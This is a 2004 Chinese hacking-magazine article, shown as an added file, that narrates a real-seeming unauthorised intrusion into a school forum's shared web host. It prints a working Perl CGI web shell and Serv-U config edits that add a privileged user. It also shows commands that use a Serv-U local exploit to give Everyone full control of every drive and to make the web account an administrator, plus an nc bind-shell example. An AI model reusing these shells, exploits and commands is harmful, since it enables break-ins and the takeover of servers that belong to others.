@@ -1,0 +1,214 @@
+剑走偏锋——灵巧的旁注攻击 
+本文作者：angel
+文章性质：原创
+发布日期：2004-11-09 
+注意：
+本文的技术并不是最新的，涉及到的技术含量也不是很多，重要的是其中的渗透思路。
+本文已在《黑客X档案》11月刊发表，版权归本站及其杂志社所有。
+
+　　终于高中毕业了，一定要在暑假努力学习，发奋学习，以前入侵少之又少，都是研究这样研究那样，实战经验太欠缺了，所以决定暑假恶补一下渗透技术，顺便又可以看看国内主机的安全性。暑假 6 月整整学习了一个月的渗透，从 xiaolu 身上学习到不少好的思路和经验。在此谢谢 xiaolu 了。 
+
+　　一个多月的时间里，渗透过上百台服务器，有独立的，有虚拟主机的，有群组的，有国内和国外，我发现一个极其严重的问题，国外的服务器，普遍安全性都非常高，管理员的安全意识非常高，做个比例，如果国内平均每 10 台服务器，能渗透进去 6 台甚至更多，那国外、台湾的，平均每 10 台服务器仅仅能渗透 1 台。当然我的水平也是一个问题。可是却反映出国内的管理员的水平的的确确比国外的要差几个档次。国内的管理员的技术和意识，迫切需要大幅度提高。 
+
+　　不过国内的也有比较 BT 的管理员，我就遇见几个服务器设置得非常。其中一个的 Documents and Settings 目录下还有 nsfocus 目录，难道是 nsfocus 公司帮做的安全？这个服务器我们没有拿下，还有另外一个，就是今天的重点。 
+
+　　一次看见了一个学校论坛（http://www.school.com），还蛮火爆的，顿时兴趣来了， ping 了一下，发现 4 个包都返回 Request timed out. 估计是搞了策略或者防火墙的，象我这种以 Web 安全的，自然喜欢从站点上找漏洞，自从学习 Web 开始，我就落下一个怪癖，就是如果实在从 Web 上找不到什么漏洞，宁愿放弃也不用什么漏洞扫描器。 
+
+　　大概看了看站点。就是一个论坛，采用 LeadBBS ，拿这个论坛没辙，还有其他办法，因为刚才我访问这个 IP ，返回“No web site is configured at this address.”，初步判断是虚拟主机，前段时间那几个黑站狂黑站的成功几率为什么这么高？因为有 http://whois.webhosting.info 这个网站，可以查询一个 IP 上，绑定了多少个域名。如果真的是虚拟主机，这个学校论坛没有漏洞，不代表其他站点就没有，很快的，我就通过一个小公司站点（ http://anyhost/ ）上的 DVBBS 6.0 传了一个 aspshell 上去，谁知道仅仅能够对自己的目录进行操作。而且自己的目录没有执行程序的权限，又用不了 Nfso ，手工跳转 URL 中的目录，也没有多少个可以浏览的，重要的 Program Files 和 Documents and Settings 目录都看不了，从 aspshell 反馈的信息来看，每个站点都设置了单独的用户，似乎一切都陷入僵局。 
+
+　　没有目的的跳转目录着…… 
+
+　　我习惯性的在 URL 跳转到 c:\php，没想到居然可以看见了，那这个主机很可能就会支持 php 了，马上传了一个 phpspy 上去，非常幸运，顺利看到了登陆入口，可是没想到进入以后才发现，php.ini 亦设置得异常 BT，安全模式打开了， phpinfo 函数也被禁用了，看不了详细的系统信息，不过看 phpspy 自带的探针可以发现，allow_url_fopen、display_errors、 register_globals 统统关闭，system、passthru、exec、shell_exec 几个函数都无一幸免的被禁用了，直接跳转目录还是只可以看到这些目录而已，各个站点的目录都是类似于 “D:\websites\school.com#dlfjurdlkfjk” 这样的，每个站点目录后面的那些字符串都不一样，也跳转不到，后来我猜测后面的字符串就是 ftp 密码，试验了一下，无法登陆，看似柳暗花明，希望又破灭了…… 
+
+　　结束了吗？不，我试着 FTP 一下： 
+
+Microsoft Windows 2000 [Version 5.00.2195]
+(C) 版权所有 1985-2000 Microsoft Corp. 
+
+C:\Documents and Settings\Administrator>ftp www.school.com
+Connected to www. school.com. 
+220 Welcome to FTP Server... 
+User (www.bjtrq.com:(none)): 
+331 User name okay, need password. 
+Password: 
+530 Not logged in. 
+Login failed. 
+ftp> bye 
+221 Goodbye! 
+ 
+
+　　从返回的信息判断，我们还是有希望的。尽管他修改了 FTP Server 的 Banner，但是从 User name okay, need password. 这句我们还是大胆的判断这个服务器就是采用 Serv-U ，我上手有目前所有版本 Serv-U 本地提升权限的 Exploit ，如果我能传一个上去，并且能够执行，一切就明朗了。再仔细想想有哪个目录可以写的？当时在 c:\php 目录下没有发现 sessiondata 目录，而且也不是自动安装版，估计管理员把 session 的目录换到其他地方了，不然这个目录是 everyone 可写的…… 
+
+　　原来我还忘记了一个最重要的目录， C:\Documents and Settings\All Users ，从这个目录可以知道很多信息，这个目录一般、至少都是 everyone 可读的，这样我们就可以知道好多有用的信息了，直接通过我的 aspshell 手工跳转到这个目录，呵呵。马上看到了想看的目录树。 
+
+Application Data
+Documents
+DRM
+Favorites
+Templates
+「开始」菜单
+桌面
+ 
+
+　　马上试试建目录，可惜里面的目录包括子目录都无法新建， BT 管理员权限设置得还真严格，不过我们还是有收获的，那就是 “C:\Documents and Settings\All Users\ 「开始」菜单 \ 程序 \”目录里，看到了很多决定结果的有用信息， 
+
+ActiveState ActivePerl 5.8
+Administrative Tools
+Deerfield.com
+DTemp
+IPSentry
+MBM 5
+NetMeter
+Network ICE
+Persits Software AspEmail
+Persits Software AspJpeg
+Serv-U FTP Server
+Symantec Client Security
+Windows 优化大师
+WinRAR
+启动
+管理工具
+附件
+ 
+
+　　呵呵，现在我们知道了好多有用的信息了，看着这些东西，可以看得出管理员对安全、效率很在意，装了 Perl，也就是说可能支持 cgi 了， IPSentry 这个可以实时检测网站的各类服务, 当某服务停止时, 该软件会打 Pager, 或 EMAIL,或发声,或运行其它软件来提醒管理员，确保服务器出现问题能及时处理，说明管理员比较负责任，NetMeter 可以对网络流量进行监控，装了黑冰防火墙和诺顿杀毒服务器版，说明管理员对于服务器的安全是很小心的，这还不算，还装了另外一个防火墙——VisNetic Firewall，真是 BT 到家了，装了优化大师，看得出这个管理员还是比较爱清洁的。从管理工具里面我们还看到了终端服务客户端生成器.lnk 、终端服务配置.lnk ，还有终端服务，这下好了，说不定顺利就可以多一台 3389 肉鸡了。 
+
+　　先通过 aspshell 下载 Serv-U 的任意一个快捷方式，然后本地查看属性的目标，呵呵，原来 Serv-U 的目录是 "C:\Program Filesewfq4qrqtgy4635\Serv-U\" ，这下好了，直接跳转目录。OH～，yes～～，看到了，马上修改 ServUDaemon.ini文件，这个服务器居然放了 280 个用户，狂晕……不管了，先在添加 [Domain1] 里加一行： 
+
+User281=angel|1|0 
+ 
+
+　　然后加上 
+
+[USER=angel|1]
+Password=ng98F85379EA68DBF97BAADCA99B69B805
+HomeDir=D:\websites
+RelPaths=1
+TimeOut=600
+Maintenance=System
+Access1=D:\websites|RWAMELCDP
+SKEYValues=
+ 
+
+　　添加一个 angel，密码为 111111 的用户，具有最高权限执行，然后我们就可以 ftp 上去 quote site exec xxxxxxxx 了，嘻嘻偷笑中…… 
+
+　　不过残酷现实再一次粉碎了我的计划，修改好文件以后提交，居然是没有修改成功，看来还是权限，权限权限整惨人啊。 
+
+　　不过还是有希望的，因为刚才我们看到了系统装了黑冰，有些版本存在“ISS RealSecure/BlackICE 协议分析模块 SMB 解析堆溢出漏洞”，可以远程利用的，手头上没有编译器，没有办法编译代码。 
+
+　　还有就是 Perl，这个是个很大的突破口，因为 Perl 目录一般要 erveryone 完全控制的，不管他用 isap 还是 perl.exe 一般都是可写、可执行的，马上下载 Perl 的快捷方式来看看路径，呵呵，看到了，原来 D:\user\bin 就是存放 perl 的 bin 目录下的所有文件，这么说这个目录可能可以写，也可能可以执行咯，马上传一个 su.exe（针对目前所有版本的 Serv-U 本地提升权限漏洞）上去，呵呵，传上去了，太好了，现在就是执行了，刚才我们试了 aspshell、phpshell 都不行，现在就看最后的希望了，找呀找啊，终于在我硬盘上找到一个 cgishell，很老了，文件日期是 2002 年 6 月 30 日的，代码如下： 
+
+#!/usr/bin/perl
+binmode(STDOUT);
+syswrite(STDOUT, "Content-type: text/html\r\n\r\n", 27);
+$_ = $ENV{QUERY_STRING};
+s/%20/ /ig;
+s/%2f/\//ig;
+$execthis = $_;
+syswrite(STDOUT, "<HTML><PRE>\r\n", 13);
+open(STDERR, ">&STDOUT") || die "Can't redirect STDERR";
+system($execthis);
+syswrite(STDOUT, "\r\n</PRE></HTML>\r\n", 17);
+close(STDERR);
+close(STDOUT);
+exit;
+ 
+
+　　我用过最好的 cgishell ，保存为一个 cgi 文件执行，晕……居然不支持！一阵阵郁闷袭来，2 秒钟的郁闷后，想到还有一线希望，那就是pl ，我们还没有试试 pl 扩展呢，把刚才的 cgi 文件改为 pl 文件，提交 http://anyhost//cmd.pl?dir ，我的天啊！！ 
+
+　　显示“拒绝访问”，终于可以执行了！太兴奋了，马上提交： 
+
+http://anyhost//cmd.pl?d:\user\bin\su.exe 
+ 
+
+　　返回： 
+
+Serv-u >3.x Local Exploit by xiaolu 
+
+USAGE: serv-u.exe "command" 
+
+Example: serv-u.exe "nc.exe -l -p 99 -e cmd.exe" 
+ 
+
+　　嘻嘻～～现在是 IUSR 权限，那又怎么样？看你这次还不死？提交： 
+
+http://anyhost//cmd.pl?d:\user\bin\su.exe "cacls.exe c: /E /T /G everyone:F" 
+
+http://anyhost//cmd.pl?d:\user\bin\su.exe "cacls.exe d: /E /T /G everyone:F" 
+
+http://anyhost//cmd.pl?d:\user\bin\su.exe "cacls.exe e: /E /T /G everyone:F" 
+
+http://anyhost//cmd.pl?d:\user\bin\su.exe "cacls.exe f: /E /T /G everyone:F" 
+ 
+
+　　返回下面的信息，就表示成功了！！！ 
+
+Serv-u >3.x Local Exploit by xiaolu 
+
+<220 Serv-U FTP Server v5.2 for WinSock ready... 
+
+>USER LocalAdministrator 
+
+<331 User name okay, need password. 
+
+****************************************************** 
+
+>PASS #l@$ak#.lk;0@P 
+
+<230 User logged in, proceed. 
+
+****************************************************** 
+
+>SITE MAINTENANCE 
+
+****************************************************** 
+
+[+] Creating New Domain... 
+
+<200-DomainID=2 
+
+<220 Domain settings saved 
+
+****************************************************** 
+
+[+] Domain xl:2 Created 
+
+[+] Creating Evil User 
+
+<200-User=xl 
+
+200 User settings saved 
+
+****************************************************** 
+
+[+] Now Exploiting... 
+
+>USER xl 
+
+<331 User name okay, need password. 
+
+****************************************************** 
+
+>PASS 111111 
+
+<230 User logged in, proceed. 
+
+****************************************************** 
+
+[+] Now Executing: cacls.exe c: /E /T /G everyone:F 
+
+<220 Domain deleted 
+
+****************************************************** 
+ 
+
+　　每提交完一次都稍微等一下，因为这些命令需要时间处理的，不一会儿，就把所有分区设置为 everyone 完全控制了，可以任意操作硬盘的东西了，但是有些命令还是受了限制，因为权限还没有提升，现在我们把自己的用户提升为管理员： 
+
+http://anyhost//cmd.pl?d:\user\bin\su.exe " net localgroup administrators IUSR_anyhost /add" 
+ 
+
+　　现在我们通过 web 方式，执行的命令就是以 administrator 的身份执行的了，相信到这里，下面的事该做什么，大家应该知道了吧？马上找到那个学校的目录，进去咯～～目的达到了，本来还想做一个 3389 的肉鸡的，想想算了，这种 BT 管理员的地盘，我也占领不了多久，留点提示到他的桌面就 over 了。 
+
+　　说真的，搞安全这么久，从来没有遇见这么棘手的虚拟主机，要不是装了 Perl，还真是束手无策！本文技术含量不高，只是分享一下希望其中的思路，如果有一个人从中受益，这篇文章就完成它的使命了。
+ 
+  
